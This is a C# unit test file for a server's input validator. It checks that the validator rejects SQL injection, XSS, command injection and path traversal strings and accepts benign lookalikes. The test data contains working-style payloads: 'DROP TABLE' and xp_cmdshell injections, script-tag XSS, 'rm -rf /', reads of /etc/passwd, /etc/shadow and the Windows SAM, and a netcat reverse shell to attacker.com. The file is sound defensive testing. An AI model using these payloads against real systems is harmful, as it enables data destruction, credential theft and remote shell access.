namespace MyMemoryServer.SecurityTests;

using Common.Contracts.Security;

public sealed class InputValidationTests
{
    private readonly Common.Security.Validation.JsonSchemaValidator _validator;

    public InputValidationTests()
    {
        _validator = new Common.Security.Validation.JsonSchemaValidator();
    }

    #region SQL注入测试

    [Theory]
    [InlineData("'; DROP TABLE users; --")]
    [InlineData("1' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("1; DELETE FROM users WHERE 1=1; --")]
    [InlineData("' UNION SELECT * FROM passwords --")]
    [InlineData("1' AND 1=1 --")]
    [InlineData("'; EXEC xp_cmdshell('dir'); --")]
    public void ValidateInput_WithSqlInjection_ShouldReturnFailure(string maliciousInput)
    {
        var parameters = new Dictionary<string, JsonElement>
        {
            ["query"] = JsonSerializer.SerializeToElement(maliciousInput)
        };

        var request = new InputValidationRequest
        {
            ToolName = "test_tool",
            Parameters = parameters
        };

        var result = _validator.DetectMaliciousContent(maliciousInput);
        result.IsValid.Should().BeFalse("SQL注入应该被检测到");
    }

    [Theory]
    [InlineData("SELECT * FROM products WHERE id = 1")]
    [InlineData("User's name")]
    [InlineData("It's a test")]
    [InlineData("Price: $100")]
    public void ValidateInput_WithValidSqlLikeContent_ShouldReturnSuccess(string validInput)
    {
        var result = _validator.DetectMaliciousContent(validInput);
        result.IsValid.Should().BeTrue("合法内容不应被误判");
    }

    #endregion

    #region XSS攻击测试

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img src=x onerror=alert('xss')>")]
    [InlineData("<svg onload=alert('xss')>")]
    [InlineData("javascript:alert('xss')")]
    [InlineData("<body onload=alert('xss')>")]
    [InlineData("<iframe src='javascript:alert(1)'>")]
    [InlineData("<div onmouseover='alert(1)'>")]
    public void ValidateInput_WithXssAttack_ShouldReturnFailure(string maliciousInput)
    {
        var result = _validator.DetectMaliciousContent(maliciousInput);
        result.IsValid.Should().BeFalse("XSS攻击应该被检测到");
    }

    [Theory]
    [InlineData("<p>This is a paragraph</p>")]
    [InlineData("<div class='container'>Content</div>")]
    [InlineData("<a href='https://example.com'>Link</a>")]
    public void ValidateInput_WithValidHtml_ShouldReturnSuccess(string validInput)
    {
        var result = _validator.DetectMaliciousContent(validInput);
        result.IsValid.Should().BeTrue("合法HTML不应被误判");
    }

    #endregion

    #region 命令注入测试

    [Theory]
    [InlineData("; rm -rf /")]
    [InlineData("| cat /etc/passwd")]
    [InlineData("$(whoami)")]
    [InlineData("`id`")]
    [InlineData("&& dir")]
    [InlineData("|| ls -la")]
    [InlineData("; nc -e /bin/sh attacker.com 4444")]
    [InlineData("| powershell -c 'Get-Process'")]
    public void ValidateInput_WithCommandInjection_ShouldReturnFailure(string maliciousInput)
    {
        var result = _validator.DetectMaliciousContent(maliciousInput);
        result.IsValid.Should().BeFalse("命令注入应该被检测到");
    }

    [Theory]
    [InlineData("echo hello")]
    [InlineData("ls -la")]
    [InlineData("grep pattern file.txt")]
    [InlineData("cat document.txt")]
    public void ValidateInput_WithValidCommandLikeContent_ShouldReturnSuccess(string validInput)
    {
        var result = _validator.DetectMaliciousContent(validInput);
        result.IsValid.Should().BeTrue("合法命令内容不应被误判");
    }

    #endregion

    #region 路径遍历测试

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
    [InlineData("....//....//etc/passwd")]
    [InlineData("%2e%2e%2f%2e%2e%2fetc/passwd")]
    [InlineData("..%252f..%252fetc/passwd")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows\\System32\\config\\SAM")]
    public void ValidateInput_WithPathTraversal_ShouldReturnFailure(string maliciousInput)
    {
        var result = _validator.DetectMaliciousContent(maliciousInput);
        result.IsValid.Should().BeFalse("路径遍历攻击应该被检测到");
    }

    [Theory]
    [InlineData("documents/report.pdf")]
    [InlineData("images/photo.png")]
    [InlineData("data/config.json")]
    [InlineData("./local/file.txt")]
    public void ValidateInput_WithValidPath_ShouldReturnSuccess(string validInput)
    {
        var result = _validator.DetectMaliciousContent(validInput);
        result.IsValid.Should().BeTrue("合法路径不应被误判");
    }

    #endregion

    #region 参数限制测试

    [Fact]
    public async Task ValidateInput_WithTooManyParameters_ShouldReturnFailure()
    {
        var parameters = new Dictionary<string, JsonElement>();
        for (int i = 0; i < 200; i++)
        {
            parameters[$"param{i}"] = JsonSerializer.SerializeToElement(i);
        }

        var request = new InputValidationRequest
        {
            ToolName = "test_tool",
            Parameters = parameters
        };

        var result = await _validator.ValidateAsync(request);
        result.IsValid.Should().BeFalse("参数数量超过限制应该被拒绝");
    }

    [Fact]
    public async Task ValidateInput_WithTooLongString_ShouldReturnFailure()
    {
        var longString = new string('a', 200000);
        var parameters = new Dictionary<string, JsonElement>
        {
            ["longParam"] = JsonSerializer.SerializeToElement(longString)
        };

        var request = new InputValidationRequest
        {
            ToolName = "test_tool",
            Parameters = parameters
        };

        var result = await _validator.ValidateAsync(request);
        result.IsValid.Should().BeFalse("超长字符串应该被拒绝");
    }

    [Fact]
    public async Task ValidateInput_WithTooLargeArray_ShouldReturnFailure()
    {
        var largeArray = Enumerable.Range(0, 2000).ToArray();
        var parameters = new Dictionary<string, JsonElement>
        {
            ["largeArray"] = JsonSerializer.SerializeToElement(largeArray)
        };

        var request = new InputValidationRequest
        {
            ToolName = "test_tool",
            Parameters = parameters
        };

        var result = await _validator.ValidateAsync(request);
        result.IsValid.Should().BeFalse("超大数组应该被拒绝");
    }

    #endregion

    #region 组合攻击测试

    [Theory]
    [InlineData("'; DROP TABLE users; <script>alert(1)</script>")]
    [InlineData("../../../etc/passwd | cat /etc/shadow")]
    [InlineData("$(whoami); <img src=x onerror=alert(1)>")]
    public void ValidateInput_WithMultipleAttacks_ShouldDetectAll(string combinedAttack)
    {
        var result = _validator.DetectMaliciousContent(combinedAttack);
        result.IsValid.Should().BeFalse("组合攻击应该被检测到");
    }

    #endregion

    #region 边界条件测试

    [Fact]
    public void DetectMaliciousContent_WithEmptyContent_ShouldReturnSuccess()
    {
        var result = _validator.DetectMaliciousContent(string.Empty);
        result.IsValid.Should().BeTrue();
    }

    [Fact]
    public void DetectMaliciousContent_WithNullContent_ShouldReturnSuccess()
    {
        var result = _validator.DetectMaliciousContent(null!);
        result.IsValid.Should().BeTrue();
    }

    #endregion
}
